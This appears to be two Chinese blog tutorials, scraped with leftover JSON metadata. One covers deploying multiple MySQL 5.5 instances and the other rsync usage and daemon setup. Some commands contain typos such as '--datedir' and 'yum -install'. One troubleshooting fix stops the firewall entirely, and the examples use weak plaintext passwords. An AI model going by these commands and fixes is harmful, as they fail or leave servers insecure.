Haproxy memcached redis等都可配置多实例。\nMySQL多实例的作用与问题 有效利用服务器资源 当单个服务器资源有剩余时，可以充分利用剩余的资源提供更多的服务，实现资源的逻辑隔离。\n节约服务器资源 当公司自己紧张，但是数据库又需要各自尽量独立地提供服务，而且需要主从复制等技术，多实例就再好不过了。\n当某个数据库实例并发很高或者有SQL慢查询时，整个实例会消耗大量的系统CPU、磁盘IO等资源，导致服务器上的其他数据库实例提供服务的质量一起下降。会存在资源互抢占问题。不同实例获取的资源是相对立的，无法像虚拟化一样完全隔离。\nMySQL多实例的生产应用场景 资金紧张型公司的选择 若公司资金紧张，公司业务访问量又不太大，但又希望不同业务的数据库服务各自尽量独立的提供服务而互相不收影响，同时，还需要主从复制等技术提供备份或读写分离服务，那么，多实例就再好不过了。比如：可以通过3台服务器部署9-15个实例，交叉做主从复制、数据备份及读写分离，这样就可达到9-15太服务器每个只装一个数据库才有的效果。这里要强调的是，所谓的尽量独立是相对的。\n并发不是特别大的业务 当公司业务访问量不太大的时候，服务器的资源基本都是浪费的，这时就很适合多实例的应用，如果对SQL语句的优化做的比较好，MySQL多实例会是一个很值得使用的技术，及时并发很大，合理分配好系统资源以及搭配好系统服务，也不会有太大问题\n门户网站应用MySQL多实例场景 门户网站通常都会使用多实例，因为配置硬件好的服务器，可节省IDC机柜空间，同时，跑多实例也会减少硬件资源跑不满的浪费。一般是丛库多实例，例如某部门中使用的IBM服务器为48核，96GB内存，一台服务器跑3-4个实例。(高配多实例，节省机柜空间，虚拟化也是这样)\nMySQL多实例常见的配置方案 单一配置文件、单一启动程序多实例部署方案 下面是MySQL官方文档提到的单一配置文件、单一启动程序多实例部署方案，不推荐此方案，这里仅作为知识点提及，不在涉及此方案说明。\n[mysqld_multi]\rmysqld=/usr/bin/mysqld_safe\rmysqladmin=/usr/bin/mysqladmin\ruser=mysql\r[mysql1]\rsocket=/var/lib/mysql/mysql.sock\rport=3306\rpid-file=/var/lib/mysql/mysql.pid\rdatadir=/var/lib/mysql\ruser=mysql\r[mysql1]\rsocket=/var/lib/mysql/mysql.sock\rport=3306\rpid-file=/var/lib/mysql/mysql.pid\rdatadir=/var/lib/mysql\ruser=mysql\rskip-name-resolve\rserver-id=10\rmysql_multi --config-file=/data/mysql/my_multi.cnf start 1,2 #\u0026lt;==启动命令\r对于该方案，缺点是耦合度太高，一个配置文件，不好管理。工作开发和运维的统一。原则：降低耦合度。\n多配置文件多启动程序部署方案 以下是已经部署好的MySQL-5.5双实例的目录信息及文件注释说明\ndata\r├── 3306\r│ ├── my.cnf #\u0026lt;==配置文件\r│ ├── data #\u0026lt;==数据文件\r│ └── mysql #\u0026lt;==多实例启动脚本\r└── 3307\r├── my.cnf\r└── mysql\r安装MySQL多实例 安装MySQL需要的依赖包和编译软件 安装MySQL之前需要安装MySQL依赖包\nyum install -y libaio-devel ncurses-devel\r安装编译MySQL需要的软件\n因MySQL5.5系列采用的cmake编译，需要先下载安装cmake\nyum install cmake -y\r采用编译方式安装MySQL tar zxf mysql-5.5.52.tar.gz\rcd mysql-5.5.52\r编译参数\ncmake . -DCMAKE_INSTALL_PREFIX=/app/mysql-5.5.54 \\\r-DMSQL_DATADIR=/app/mysql-5.5.54/data \\\r-DMYSQL_UNIX_ADDR=/app/mysql-5.5.54/tmp/mysql.sock \\\r-DDEFAULT_CHARSET=utf8 \\\r-DDEFAULT_COLLATION=utf8_general_ci \\\r-DEXTRA_CHARSETS=gbk,gb2312,utf8,ascii \\\r-DENABLED_LOCAL_INFILE=ON \\\r-DWITH_INNOBASE_STORAGE_ENGINE=1 \\\r-DWITH_FEDERATED_STORAGE_ENGINE=1 \\\r-DWITH_BLACKHOLE_STORAGE_ENGINE=1 \\\r-DWITH_EXAMPLE_STORAGE_ENGINE=1 \\\r-DWITHOUT_PARTITION_STORAGE_ENGINE=1 \\\r-DWITH_FAST_MUTEXES=1 \\\r-DWITH_ZLIB=bundled \\\r-DENABLED_LOCAL_INFILE=1 \\\r-DWITH_READLINE=1 \\\r-DWITH_EMBEDDED_SERVER=1 \\\r-DWITH_DEBUG=0\r创建软连接\nln -s /app/mysql-5.5.54/ /app/mysql\r创建MySQL多实例的数据文件目录 在企业中，通常以 /data 目录作为MySQL多实例总的根目录，然后规划不同的数字（即MySQL实例端口号）作为/data下面的二级目录，不同的二级目录对应的数字就作为MySQL实例的端口号，以区别不同的实例，数字对应的二级目录下包含MySQL的数据文件、配置文件及启动文件等。 创建数据目录\nmkdir -p /data/{3306,3307}/data # 多个可以依次累加，生产环境中一般3-4个实例为最佳。\r创建MySQL多实例的配置文件 MySQL数据库默认为用户提供了多个配置文件模板，用户可以根据服务器硬件配置的大小来选择。\n$ ls /app/mysql/support-files/my*.cnf\rmy-huge.cnf my-medium.cnf\rmy-innodb-heavy-4G.cnf my-small.cnf\rmy-large.cnf\r上面是单实例的默认配置文件模板，如果配置多实例，和单实例会有不同。为了让MySQL多实例之间彼此独立，因此要为每一个实例建立一个my.cnf配置文件和一个启动文件mysql，让他们分别对应自己的数据文件目录data 创建配置文件及目录略，一般都是用配置好的配置文件与脚本\n配置权限 $ find /data -type f -name 'mysql' #\u0026lt;==启动脚本中存在mysql密码要注意权限\r/data/3306/mysql\r/data/3307/mysql\rfind /data -type f -name 'mysql'|xargs chmod 700\rMySQL相关命令加入全局路径的配置 echo \u0026quot;PATH=/app/mysql/bin:$PATH\u0026quot;\rln -s /app/mysql/bin/* /usr/sbin/ 初始化多实例数据库文件 上述步骤全部配置完毕后，就可以初始化数据库文件了，这个步骤其实也可以在编译安装MySQL之后就操作，只不过放到这里更合理，\n初始化MySQL数据库 初始化数据库会有很多提示，如果没有error级别的错误，有两个ok字样表示初始化成功，否则就解决初始化问题\ncd /app/mysql/script/\r./mysql_install_db \\\r--basedir=/app/mysql/ \\\r--datedir=/data/3306/data \\\r--user=mysql\r./mysql_install_db \\\r--basedir=/app/mysql/ \\\r--datadir=/data/3306/data \\\r--user=mysql \\\r--defaults-file=/data/3306/my.cnf\r初始化数据可的原理及结果说明 初始化数据库的实质就是创建基础的数据库系统的库文件，例如：生成MySQL库表等。 初始化数据可偶查看对应实例的数据目录，可以看到多了一些文件 启动MySQL多实例数据库\n/data/3306/mysql start\r/data/3307/mysql start\r$ netstat -nltup tcp 0 0 0.0.0.0:3306 0.0.0.0:* LISTEN 38980/mysqld tcp 0 0 0.0.0.0:3307 0.0.0.0:* LISTEN 22942/mysqld tcp 0 0 :::52113 :::* LISTEN 1123/sshd MySQL多实例启动故障排错说明 如果MySQL多实例有服务没有被启动，排查办法如下：\n如果发现没有显示MySQL对应实例的端口，请稍微等待几秒再检查，MySQL服务的启动比web服务慢一些\n如果还是不行，请查看MySQL服务对应实例的错误日志，错误日志路径在my.cnf配置的最下面定义。\n例如3306的错误日志为：\n[mysqld_safe]\rlog-error=/data/3306/mysql_3306.err\rpid-file=/data/3306/mysqld.pid\r细看所有执行命令返回屏幕输出，不要忽略关键的输出内容。 辅助查看系统日志/var/log/message 如果是MySQL关联了其他服务。要同时查看相关服务的日志 配置及管理MySQL多实例数据库 配置MySQL多实例数据库开机自启动 服务的开机自启动很关键，MySQL多实例的启动也不例外。\n登陆MySQL测试\n$ mysql -S /data/3306/mysql.sock #←socket用于区别不同的实例\rWelcome to the MySQL monitor. Commands end with ; or \\g.\r.....\rType 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.\rMySQL多实例数据库的管理方法 MySQL安装完成后，默认root账户是没有密码的，登陆不同的实例需要指定不同实例的socket路径及文件，在my.cnf中指定的。注意：不同的socket虽然名字相同，但是路径是不同的，因此是不同的文件。\nmysql -S /data/3306/mysql.sock\rmysql -S /data/3307/mysql.sock\r重启多实例 若要重启多实例数据库也需要进行相应的配置。在重启数据库前，需要调整不同实例启动文件里对应的数据库密码：\nsed -n '13p' mysql\rsed -i 's#mysql_pwd=\u0026quot;oldboy\u0026quot;#mysql_pwd=\u0026quot;111\u0026quot;#g' mysql ../3307/mysql\rsed -i 's#mysql_pwd=\u0026quot;oldboy\u0026quot;#mysql_pwd=\u0026quot;111\u0026quot;#g' mysql ../3307/mysql\rsed -n '13p' mysql\r由于选择了mysqladmin shutdown的停止方式，所以停止数据库时，需要在启动文件里配置数据库的密码。上面由于密码不对，顾提示密码不对的错误\n$ /data/3306/mysql stop\rStoping MySQL...\r/app/mysql/bin/mysqladmin: connect to server at 'localhost' failed\rerror: 'Access denied for user 'root'@'localhost' (using password: YES)'\r$ /data/3306/mysql stop -S /data/3306/mysql.sock Stoping MySQL...\r提示：禁止使用pkill、kill -9 killall -9等命令强制杀死数据库，这回引起数据库无法启动等故障发生。\n多实例MySQL登陆问题 多实例本地登陆MySQL 多实例本地登陆一般是通过socket文件来指定具体登陆到那个实例的，此文件的具体位置是在mysql编译过程或my.cnf文件里指定的。在本地登陆数据库时，登陆程序会通过socket文件来判断登陆的是哪个数据库实例。\n例如：通过mysql -uroot -p111 -S /data/3307/mysql.sock可知，登陆的是3307实例。mysql.sock是MySQL服务器端与本地MySQL客户端进行通信的Unix套接字文件。\n远程连接登陆mysql 远程登陆MySQL多实例中的一个实例时，通过TCP端口(port)来指定所要登陆的MySQL实例，此端口的配置是在MySQL配置文件my.cnf指定的\n例如：在mysql -uroot -p111 -h192.16-P3307 -P为端口参数，后面接具体的实例端口，端口是一种 “逻辑连接位置” ，是客户端程序被分派到计算机上特殊服务程序的一种方式，强调提前在192.168.1.2上对该用户做授权。\nDROP USER 'monitor'@'%';\rmysql\u0026gt; select user,host from mysql.user;\r+----------+------------+\r| user | host |\r+----------+------------+\r| root | 127. |\r| root | localhost |\r+----------+------------+\r--MySQL的用户加主机名组成一个用户\rmysql\u0026gt; select user();\r+----------------+\r| user() |\r+----------------+\r| root@localhost |\r+----------------+\r常见错误 安装报错解决 Access denied for user 'root'@'localhost' (using password: NO) ERROR 1045 (28000): Access denied for user 'root'@'localhost' (using password: NO)\r问题原因：密码不对哦\nError: Can't create/write to file Error: Can't create/write to file '/tmp/#sql_4f4_0.MYD' (Errcode: 17)\r问题原因： 权限问题\n解决方法：chmod -R 1777 /tmp\nERROR 2002 (HY000): Can't connect to local ERROR 2002 (HY000): Can't connect to local MySQL server through socket '/var/run/mysqld/mysqld.sock' (2)\r问题原因：⑴ 服务没启动 ⑵ 配置文件中socket文件与编译时指定路径不一致\n解决方法：⑴ 启动服务 ⑵ 多实例启动指定socket文件\nerror while loading shared libraries: $ /app/mysql/scripts/mysql_install_db \\\r--basedir=/app/mysql/ \\\r--datadir=/app/mysql/data \\\r--user=mysql\rInstalling MySQL system tables...\r/app/mysql//bin/mysqld:error while loading shared libraries: libaio.so.1: cannot open shared object file: No such file or directory\r问题原因：缺少libaio包支持\n解决方法：安装后重新初始化即可\nyum -install libaio* -y\rWARNING: The host 'xxx' WARNING: The host 'centos' could not be looked up with resolveip.\r问题原因：需要修改主机名的解析，使其和uname -n一样\nERROR: 1004 Can’t create file ERROR: 1004 Can’t create file '/tmp/#sql300e_1_0.frm' (error: 13)\r解决：原因是/tmp权限有问题(不解决，后面可能无法登陆数据库)\n使用错误解决 ERROR 2006 在大批量导入数据库时，出现如下错误\nERROR 2006 (HY000): MySQL server has gone away\rNo connection. Trying to reconnect...\r排查思路：后来检查了没有导入成功的几篇文章，其大小都在8MB以上，会不会是单条记录太大了导致出现ERROR 2006 (HY000): MySQL server has gone away的呢？\n查看允许的最大值\n登陆MySQL后，使用如下命令查询：\nmysql\u0026gt; show global variables like 'max_allowed_packet'; +--------------------+---------+\r| Variable_name | Value |\r+--------------------+---------+\r| max_allowed_packet | 8388608 |\r+--------------------+---------+\r上限是刚好8MB，怪不得报错。\n即时生效方法\nset global max_allowed_packet=1024*1024*16;\r可在不重启MySQL的情况下立即生效，但是重启后就会恢复原样。\n永久生效方法\n编辑 /etc/my.cnf ，将\nmax_allowed_packet = 1M\r修改为\nmax_allowed_packet = 16M\r之后重新导入，就不会产生ERROR 2006 (HY000): MySQL server has gone away错误了。 Unknown/unsupported storage engine: Innodb Plugin \u0026lsquo;InnoDB\u0026rsquo; init function returned error.\nmysql\u0026gt; show warnings;\r+---------+------+----------------------------------------+\r| Level | Code | Message |\r+---------+------+----------------------------------------+\r| Warning | 1292 | Truncated incorrect DOUBLE value: 'Y ' |\r| Warning | 1292 | Truncated incorrect DOUBLE value: 'Y ' |\r| Warning | 1292 | Truncated incorrect DOUBLE value: 'Y ' |\r| Warning | 1292 | Truncated incorrect DOUBLE value: 'Y ' |\r| Warning | 1292 | Truncated incorrect DOUBLE value: 'Y ' |\r| Warning | 1292 | Truncated incorrect DOUBLE value: 'Y ' |\r| Warning | 1292 | Truncated incorrect DOUBLE value: 'Y ' |\r| Warning | 1292 | Truncated incorrect DOUBLE value: 'Y ' |\r| Warning | 1292 | Truncated incorrect DOUBLE value: 'Y ' |\r| Warning | 1292 | Truncated incorrect DOUBLE value: 'Y ' |\r| Warning | 1292 | Truncated incorrect DOUBLE value: 'Y ' |\r| Warning | 1292 | Truncated incorrect DOUBLE value: 'Y ' |\r| Warning | 1292 | Truncated incorrect DOUBLE value: 'Y ' |\r| Warning | 1292 | Truncated incorrect DOUBLE value: 'Y ' |\r| Warning | 1292 | Truncated incorrect DOUBLE value: 'Y ' |\r| Warning | 1292 | Truncated incorrect DOUBLE value: 'Y ' |\r| Warning | 1292 | Truncated incorrect DOUBLE value: 'Y ' |\r| Warning | 1292 | Truncated incorrect DOUBLE value: 'Y ' |\r| Warning | 1292 | Truncated incorrect DOUBLE value: 'Y ' |\r| Warning | 1292 | Truncated incorrect DOUBLE value: 'Y ' |\r| Warning | 1292 | Truncated incorrect DOUBLE value: 'Y ' |\r| Warning | 1292 | Truncated incorrect DOUBLE value: 'Y ' |\r| Warning | 1292 | Truncated incorrect DOUBLE value: 'Y ' |\r| Warning | 1292 | Truncated incorrect DOUBLE value: 'Y ' |\r| Warning | 1292 | Truncated incorrect DOUBLE value: 'Y ' |\r| Warning | 1292 | Truncated incorrect DOUBLE value: 'Y ' |\r| Warning | 1292 | Truncated incorrect DOUBLE value: 'Y ' |\r| Warning | 1292 | Truncated incorrect DOUBLE value: 'Y ' |\r| Warning | 1292 | Truncated incorrect DOUBLE value: 'Y ' |\r| Warning | 1292 | Truncated incorrect DOUBLE value: 'Y ' |\r| Warning | 1292 | Truncated incorrect DOUBLE value: 'Y ' |\r| Warning | 1292 | Truncated incorrect DOUBLE value: 'Y ' |\r| Warning | 1292 | Truncated incorrect DOUBLE value: 'Y ' |\r| Warning | 1292 | Truncated incorrect DOUBLE value: 'Y ' |\r| Warning | 1292 | Truncated incorrect DOUBLE value: 'Y ' |\r| Warning | 1292 | Truncated incorrect DOUBLE value: 'Y ' |\r| Warning | 1292 | Truncated incorrect DOUBLE value: 'Y ' |\r| Warning | 1292 | Truncated incorrect DOUBLE value: 'Y ' |\r| Warning | 1292 | Truncated incorrect DOUBLE value: 'Y ' |\r| Warning | 1292 | Truncated incorrect DOUBLE value: 'Y ' |\r| Warning | 1292 | Truncated incorrect DOUBLE value: 'Y ' |\r| Warning | 1292 | Truncated incorrect DOUBLE value: 'Y ' |\r| Warning | 1292 | Truncated incorrect DOUBLE value: 'Y ' |\r| Warning | 1292 | Truncated incorrect DOUBLE value: 'Y ' |\r| Warning | 1292 | Truncated incorrect DOUBLE value: 'Y ' |\r| Warning | 1292 | Truncated incorrect DOUBLE value: 'Y ' |\r| Warning | 1292 | Truncated incorrect DOUBLE value: 'Y ' |\r| Warning | 1292 | Truncated incorrect DOUBLE value: 'Y ' |\r| Warning | 1292 | Truncated incorrect DOUBLE value: 'Y ' |\r| Warning | 1292 | Truncated incorrect DOUBLE value: 'Y ' |\r| Warning | 1292 | Truncated incorrect DOUBLE value: 'Y ' |\r| Warning | 1292 | Truncated incorrect DOUBLE value: 'Y ' |\r| Warning | 1292 | Truncated incorrect DOUBLE value: 'Y ' |\r| Warning | 1292 | Truncated incorrect DOUBLE value: 'Y ' |\r| Warning | 1292 | Truncated incorrect DOUBLE value: 'Y ' |\r| Warning | 1292 | Truncated incorrect DOUBLE value: 'Y ' |\r| Warning | 1292 | Truncated incorrect DOUBLE value: 'Y ' |\r| Warning | 1292 | Truncated incorrect DOUBLE value: 'Y ' |\r| Warning | 1292 | Truncated incorrect DOUBLE value: 'Y ' |\r| Warning | 1292 | Truncated incorrect DOUBLE value: 'Y ' |\r| Warning | 1292 | Truncated incorrect DOUBLE value: 'Y ' |\r| Warning | 1292 | Truncated incorrect DOUBLE value: 'Y ' |\r| Warning | 1292 | Truncated incorrect DOUBLE value: 'Y ' |\r| Warning | 1292 | Truncated incorrect DOUBLE value: 'Y ' |\r+---------+------+----------------------------------------+\r64 rows in set (0.00 sec)\r","permalink":"https://www.oomkill.com/2017/05/ch1-mysql-deployment/","summary":"","title":"ch01 - Linux下安装Mysql"},{"content":"Overview 官方网站：https://www.samba.org/ftp/rsync/rsync.html\nrsync特性\nrsync类似于scp的功能\nrsync还可以在本地的不同分区和目录之间进行全量及增量的复制数据，类似cp又优于cp\nrsync可以实现文件的删除\n一个rsync相当于 scp cp rm，但是还优于他们每一个\n支持拷贝特殊文件如链接文件，设备等 可以有排除指定文件或目录的权限、时间、软硬链接、属主、组所有属性均不改变-p 可以有排除指定文件或目录的功能，相当于打包命令tar的排除功能 可以实现增量同步，即只同步发生变化的数据，因此数据传输效率很高tar。 可以使用rcp rsh ssh等方式来配合传输文件（rsync本身不对数据加密） 可以通过socket（进程方式）传输文件和数据 支持匿名的或认证（无须系统用户）的进程模式传输，可实现方便安全的进行数据备份及镜像 安装rsync linux上安装rsync Platform Command Debian/Ubuntu \u0026amp; Mint sudo apt-get install rsync Arch Linux pacman -S rsync Gentoo emerge sys-apps/rsync Fedora/CentOS/RHEL and Rocky Linux/AlmaLinux sudo yum install rsync openSUSE sudo zypper install rsync windows安装rsync 官网下载cwRsync的服务端和客户端软件，cwRsync官网为：www.itefix.net/cwrsync\nNotes：由于伟大的 people‘s leader president xi 网站已经无法中国地区访问（点击测试），伟大的俄罗斯因为俄乌战争，也不对俄罗斯访问了（俄乌战争开始后，西方大量学术网站禁止了俄罗斯地区的访问）\n所以目前只能下载到一些镜像站上4.x版本，截止到2022年11月的6.2.7相差很多，windows客户端版本可以通过chocolate 安装\nrsync使用说明 rsync命令语法\n选项 注释说明 rsync rsync同步命令 option 为同步时的选项参数 src 为源，及待拷贝的分区、文件或目录等 dest 为目标分区、文件或目录等 rsync参数说明\n参数选项 注释说明 -v \u0026ndash;verbose 详细模式输出，传输时的进度信息 -z \u0026ndash;compress 传输时进行压缩以提高传输效率，--compress-level=NUM 可按级别压缩 -a \u0026ndash;archive 归档模式，表示以递归方式传输文件，并保持所有文件属性，等于-rtopgDl r \u0026ndash;recursive 对子目录进行递归模式，即目录下的所有目录都同样传输 t \u0026ndash;times 保持文件时间信息 o \u0026ndash;owner 保持文件属主信息 p \u0026ndash;perms 保持文件权限 g \u0026ndash;group 保持文件属主信息 P \u0026ndash;progress 显示同步的过程及传输时的进度等信息 D \u0026ndash;devices 爆出设备文件信息 l \u0026ndash;links 保留软连接 -e \u0026ndash;rsh=COMMAND 使用的信道协议，制定替代rsh的shell程序，例如ssh -exclude=PATTERN 制定排除不需要传输的文件模式 \u0026ndash;bwlimit=RATE 限制socket I/O带宽 \u0026ndash;password-file=PATH 指定密码文件，可避免多次输入密码 \u0026ndash;delete 如果服务器端为空，而客户端有文件，加上这个参数就会删除客户端目录下所有文件，相当于rm \u0026ndash;exclude 排除单/多个文件 \u0026ndash;timeout=秒 超时参数 \u0026ndash;port 指定端口 -R \u0026ndash;relative 使用相对路径信息 -u \u0026ndash;update 仅仅进行更新，也就是跳过所有已经存在于DST，并且文件时间晚于要备份的文件。(不覆盖更新的文件) rsync配置文件说明 # 每一个程序的进程都要依赖一个用户，默认为nobody，给默认为rsync uid = rsync gid = rsync # 防止出现安全问题的，一般为局域网 use chroot = no # 有多少个客户端可以连接服务器 同时连接的客户端 max connections = 200 # 客户端连接多少时间超时（如连接了不穿数据，多少时间踢掉） timeout = 300 # linux中每个进程都对应一个进程号pid ，pid所在的文件就是pidfile，将来处理进程的时候不用再找了，直接杀pid文件就行 pid file = /var/run/rsyncd.pid # rsync 在传输数据时，双方都在穿可能出错，在一个用户改的时候，其他用户不能改 lock file = /var/run/rsync.lock # 日志，出错 log file = /var/log/rsyncd.log # 模块 相当于nfs共享的目录 可以理解为nfs的 [oldboy] path = /oldboy/ # 在传输过程中遇到错误自动忽略 ignore errors # 可读可写 read only = false # 允不允许你列表 false不允许 list = false # 允许的主机 hosts allow = 10.0.0.0/24 # 拒绝 rsync支持虚拟用户，不是系统用户，这 hosts deny = 0.0.0.0/32 # 传输时验证的用户 auth users = rsync_backup # 用户对应的密码文件，如果指定密码文件，就得来回输入密码，在内网中不需要重复输入密码，就将密码写入文件 secrets file = /etc/rsync.password rsync的工作模式 rsync提供了三种同步模式：\nRsync over SSH Rsync Daemon Local Local rsync如果不使用远程模式类似于cp命令，例如\nrsync /etc/hosts /opt/ == cp /etc/hosts/ /opt/ 注：目录结尾加 / 与不加 / 的区别，不加斜线表示目录以及目录里面的东西，加斜线表示目录里面的东西\nrsync作为damon模式运行 如果主机没有运行 SSH服务，可以使用 rsync --daemon 配置并作为守护进程运行。这种场景下 rsync 监听端口 873 以获取来自其他使用 rsync client 的同步，这种模式下数据是未加密的。\n配置daemon端 配置rsync daemon位置文件\nrsync damon模式配置文件默认在 /etc/rsyncd.conf 如果没有可以自行创建\nlock file = /var/run/rsync.lock log file = /var/log/rsyncd.log pid file = /var/run/rsyncd.pid [documents] path = /home/juan/Documents comment = The documents folder of Juan uid = juan gid = juan read only = no list = yes auth users = rsyncclient secrets file = /etc/rsyncd.secrets hosts allow = 192.168.1.0/255.255.255.0 rsyncd配置文件分为两部分，全局参数与模块。\nlock file 是 rsync 用于处理最大连接数的文件 log file 是 rsync 同步时的日志；汇集路开始运行的时间, 其他客户端连接的时间与任何错误 pid file 是 rsync 记录了进程ID，可以使用这个文件来kill进程 在全局参数之后，[] 中的是模块部分，代表的是要同步的一个目录，每个模块都是要共享的文件夹\n[name] 分配给模块的名称，每个模块代表一个目录，不能包含斜杠或右方括号 path 同步的文件夹的路径 comment 当客户端获取所有可用模块的时，获取出的列表内模块名称旁边的注释 uid 当 rsync守护进程以root 身份运行时，可以指定以哪个用户拥有文件的权限 gid 同上 read only 决定rsync 客户端是否可以上传文件，默认所有模块为 true list 允许客户端请求可用模块列表，false 为从列表中隐藏模块。 auth users 允许访问该模块内容的用户列表，用户以逗号分隔。用户不需要存在于系统中，他们由密钥文件定义 secrets file 定义包含rsync同步时用户的用户名和密码的文件 hosts allow 允许连接到rsync daemon的网段，默认允许所有主机连接 创建rsync用户\n$ useradd rsync -s /sbin/nologin -M 修改共享的目录的所属权限\n$ chown -R rsync.rsync /data 创建密码文件\n该文件中，每行代表一个rsync用户，账号和密码用冒号分隔\n$ echo \u0026quot;rsync_backup:111111\u0026quot;\u0026gt; /etc/rsync.password # 因密码可读，所以要降低权限 $ chmod 600 /etc/rsync.password 最后，更改此文件的权限，使其不能被其他用户读取或修改。如果此文件的权限设置不正确，rsync 会报错\nsudo chmod 600 /etc/rsyncd.secrets 启动 rsync daemon\n直接使用 --daemon 启动即可\nsudo rsync --daemon 使用rsync连接daemon一端 使用 rsync 命令连接 rsync daemon时，不可以像使用 SSH 时那样使用冒号，我们需要使用双冒号 ”::“，后跟模块名，以及同步的文件或文件夹，例如\nrsync -rtv user@host::module/source/ destination/ 另一种方法是增加 rsync:// 协议，例如\nrsync -rtv rsync://user@host/module/source/ destination/ 如果不想输入密码可以指定参数 --password-file= 提供密码文件，密码文件就是创建的secret file，例如\n$ rsync -avz rsync_backup@192.168.59.121::data \\ /test \\ --password-file=/etc/rsync.password 使用rsync命令推与拉\nPull rsync [OPTION...] [USER@]HOST::SRC... [DEST]\nrsync -avz rsync_backup@192.168.59.121::data /test/ --password-file=/etc/rsync.password Push rsync [OPTION...] SRC... [USER@]HOST::DEST || rsync [OPTION...] SRC... rsync://[USER@]HOST[:PORT]/DEST\nrsync -avz /test/ rsync://rsync_backup@192.168.59.121/data/ --password-file=/etc/rsync.password Rsync Over SSH 除了daemon模式，也可以使用ssh模式进行传输，例如使用Over SSH命令\nPush rsync [OPTION]... -e ssh [SRC]... [USER@]HOST:DEST Pull rsync [OPTION]... -e ssh [USER@]HOST:SRC... [DEST] 较新版本的 rsync SSH 为默认，可以省略该-e ssh选项，但 over ssh 与 over daemon的区别还是 一个冒号与两个冒号\nrsync使用实例 Over SSH Pull rsync -avz -e 'ssh -p \u0026lt;port\u0026gt;' \u0026lt;user\u0026gt;@\u0026lt;host\u0026gt;:/\u0026lt;remote_dir\u0026gt; /\u0026lt;local_dir\u0026gt; Push rsync -avz -e 'ssh -p \u0026lt;port\u0026gt;' /\u0026lt;local_dir\u0026gt; \u0026lt;user\u0026gt;@\u0026lt;host\u0026gt;:/\u0026lt;remote_dir\u0026gt; Local to Remote Push rsync -avzh \u0026lt;local_dir\u0026gt; \u0026lt;system_user\u0026gt;@\u0026lt;host\u0026gt;:\u0026lt;remote_dir\u0026gt; Pull rsync -avzh \u0026lt;system_user\u0026gt;@\u0026lt;host\u0026gt;:\u0026lt;remote_dir\u0026gt; \u0026lt;local_dir\u0026gt; 显示进度条 rsync -avzhe ssh --progress \u0026lt;local_dir\u0026gt; \u0026lt;system_user\u0026gt;@\u0026lt;host\u0026gt;:\u0026lt;remote_dir\u0026gt; Include and exclude 排除和包含可以使用文件，也可以使用正则表达式，例如\n包含R开头文件： rsync -avze --include 'R*' \u0026lt;system_user\u0026gt;@\u0026lt;host\u0026gt;:\u0026lt;remote_dir\u0026gt; \u0026lt;local_dir\u0026gt; 排除所有文件： rsync -avze --exclude '*' \u0026lt;system_user\u0026gt;@\u0026lt;host\u0026gt;:\u0026lt;remote_dir\u0026gt; \u0026lt;local_dir\u0026gt; 仅上传R开头的文件：rsync -avze ssh --include 'R*' --exclude '*' \u0026lt;system_user\u0026gt;@\u0026lt;host\u0026gt;:\u0026lt;remote_dir\u0026gt; \u0026lt;local_dir\u0026gt; --exclude-from 是同步时排除文件中指定的文件 已存在文件的处理策略 如果想保证 \u0026lt;Src\u0026gt; 与 \u0026lt;DST\u0026gt; 保持一致可以使用 --delete 来删除 \u0026lt;Src\u0026gt; 现有文件或目录（只存在于目标目录不存在于源目标的文件）\nrsync -avz --delete \u0026lt;system_user\u0026gt;@\u0026lt;host\u0026gt;:\u0026lt;remote_dir\u0026gt; \u0026lt;local_dir\u0026gt; 当在删除或更新目标目录已经存在的文件时，不想删除而想备份，可以指定参数 -b, --backup\n限制传输文件大小 可以使用 “ -–max-size ” 选项指定要传输或同步的最大文件大小。例如限制最大为200k\nrsync -avzhe ssh --max-size='200k' \u0026lt;local_dir\u0026gt; \u0026lt;system_user\u0026gt;@\u0026lt;host\u0026gt;:\u0026lt;remote_dir\u0026gt; 同步成功后自动删除源文件 删除发送方的文件：如果不想将备份的本地副本保留在服务器中，可以使用参数 “ \u0026ndash;remove-source-files ” 来自动删除 \u0026lt;src\u0026gt; 的文件吗，一般用于Push场景中。\nrsync --remove-source-files -zvh \u0026lt;local_dir\u0026gt; \u0026lt;system_user\u0026gt;@\u0026lt;host\u0026gt;:\u0026lt;remote_dir\u0026gt; dry run 与kubectl一样，rsync也支持 --dry-run ，该选项不会对文件进行更改但会显示命令的输出，可以与 -v 参数配合，这样就可以看到哪些内容会被同步\nrsync --dry-run --remove-source-files -zvh \u0026lt;local_dir\u0026gt; \u0026lt;system_user\u0026gt;@\u0026lt;host\u0026gt;:\u0026lt;remote_dir\u0026gt; 限制传输时带宽 传输时，可以使用选项 “ \u0026ndash;bwlimit ” 选项限制I/O带宽（默认单位KB），例如\nrsync --bwlimit=100 -avzhe ssh \u0026lt;local_dir\u0026gt; \u0026lt;system_user\u0026gt;@\u0026lt;host\u0026gt;:\u0026lt;remote_dir\u0026gt; 忽略存在 如果目标目录中已经该文件，则忽略，例如\nrsync --ignore-existing -zvh \u0026lt;local_dir\u0026gt; \u0026lt;system_user\u0026gt;@\u0026lt;host\u0026gt;:\u0026lt;remote_dir\u0026gt; 同步策略 默认rsync 只检查文件的大小和最后修改日期是否发生变化，如果发生变化，就重新传输；参数 -c，--checksum 可以改变rsync 的校验方式，会通过判断文件内容的校验和，决定是否重新传输。\n参数 --size-only 可以使rsync只同步大小有变化的文件，不考虑文件修改时间的差异。\ntroubleshooting rsync error: some files/attrs were not transferred (see previous errors) (code 23) at main.c(1039) [sender=3.0.6] 问题原因：服务器端目录不存在。\n解决：在服务器端创建目录即可解决\n日志：2017/05/07 08:02:16 [2852] rsync: chdir /data1 failed:No such file or directory (2)\nrsync: failed to set times on \u0026quot;.\u0026quot; (in data1): Operation not permitted (1) 问题原因：服务器端模块目录权限不对\n解决方法：将服务器模块目录权限更改为rsyncd.conf中的uid与gid\n日志：2017/05/07 08:07:49 [2862] rsync: mkstemp \u0026quot;.paichu.log.yOhm5e\u0026quot; (in data1) failed: Permission denied\nrsync: failed to connect to 192.168.59.121: No route to host (113) rsync error: error in socket IO (code 10) at clientserver.c(124) [sender=3.0.6] 问题原因：防火墙处于开启状态\n解决方法：关闭防火墙 /etc/init.d/iptables stop\n@ERROR: auth failed on module data1 rsync error: error starting client-server protocol (code 5) at main.c(1503) [sender=3.0.6] 错误原因：\n配置文件语法错误 密码与用户名错误 密码文件权限过大 解决方法：查看日志，查找具体问题\n日志文件：secrets file must not be other-acessible (see strict modes option)\nrsync: failed to connect to 192.168.59.121: Connection refused (111) rsync error: error in socket IO (code 10) at clientserver.c(124) [receiver=3.0.6] 原因：rsync服务没开启\n*** Skipping any contents from this failed directory *** 